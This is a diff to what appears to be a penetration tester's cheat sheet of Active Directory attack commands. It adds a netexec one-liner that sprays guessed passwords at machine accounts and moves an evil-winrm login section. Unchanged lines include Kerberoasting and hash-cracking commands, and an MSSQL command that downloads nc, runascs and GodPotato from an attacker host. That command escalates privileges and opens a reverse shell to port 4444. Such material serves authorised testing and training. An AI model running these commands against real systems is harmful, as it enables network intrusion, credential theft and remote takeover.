@@ -354,6 +354,7 @@ impacket-changepasswd $DOM/ -dc-ip $TARGET -k -no-pass
 impacket-changepasswd $DOM/'$USERNAME':'$PASSWORD'@$TARGET -newpass 'Password12345!' -dc-ip $TARGET
 impacket-GetADUsers $DOM/ -dc-ip $TARGET -k -no-pass
 impacket-GetADComputers $DOM/ -dc-ip $TARGET -k -no-pass
+nxc ldap $TARGET -u '$USERNAME' -p '$PASSWORD' --query "(SAMAccountType=805306369)" "SAMAccountName" | awk '{print $6}' | grep '\$' > machines | sed 's/.$//' | tr '[:upper:]' '[:lower:]' > machines_pw; nxc smb $TARGET -u machines -p machines_pw | grep -oP '\[-\].*TRUST_ACCOUNT.*' | while read line; do echo -e "\e[1;33m$line <--- CHANGE PASSWORD NOW\!\e[0m"; done
 impacket-GetNPUsers $DOM/ -dc-ip $TARGET -usersfile usernames -k -no-pass
 impacket-GetUserSPNs $DOM/ -dc-ip $TARGET -usersfile usernames -k -no-pass
 impacket-GetUserSPNs $DOM/'$USERNAME':'$PASSWORD' -dc-ip $TARGET -request
@@ -381,6 +382,10 @@ certipy-ad req -target '$DC' -ca '$CA' -upn 'Administrator' -template 'RetroClie
 [*] (3389) RDP
 xfreerdp /v:'$TARGET' -sec-nla /tls-seclevel:0 /dynamic-resolution +clipboard
 xfreerdp /u:'$USERNAME' /p:'$PASSWORD' /v:'$TARGET' /tls-seclevel:0 /dynamic-resolution +clipboard
+
+[*] (5985) WINRM
+evil-winrm -i "$TARGET" -u '$USERNAME' -p '$PASSWORD'
+evil-winrm -i "$TARGET" -u '$USERNAME' -H '$HASH'
 
 [*] MSSQL
 netexec mssql $TARGET -u sa -p 'MSSQLP@ssw0rd!' --local-auth -X 'certutil -urlcache -f http://$MYIP:8088/runascs.exe C:\programdata\runascs.exe;certutil -urlcache -f http://$MYIP:8088/nc.exe C:\programdata\nc.exe; certutil -urlcache -f http://$MYIP:8088/GodPotato-NET4.exe C:\programdata\GodPotato-NET4.exe; C:\programdata\runascs.exe sql_svc WqSZAF6CysDQbGb3 --logon-type 5 -b "C:\programdata\GodPotato-NET4.exe -cmd \"cmd /c C:\programdata\nc.exe -e cmd.exe $MYIP 4444\""'
@@ -488,10 +493,6 @@ Rubeus.exe kerberoast
 nano hashes; cat hashes | awk '{$1=$1}1' | tr -d '\n' | tee hashes; john hashes -w=/usr/share/wordlists/rockyou.txt --format=krb5tgs
 Rubeus.exe asreproast
 nano hashes; cat hashes | awk '{$1=$1}1' | tr -d '\n' | tee hashes; john hashes -w=/usr/share/wordlists/rockyou.txt --format=krb5asrep
-
-[*] evil-winrm
-evil-winrm -i "$TARGET" -u '$USERNAME' -p '$PASSWORD'
-evil-winrm -i "$TARGET" -u '$USERNAME' -H '$HASH'
 
 [*] url / .lnk exploits
 click.url
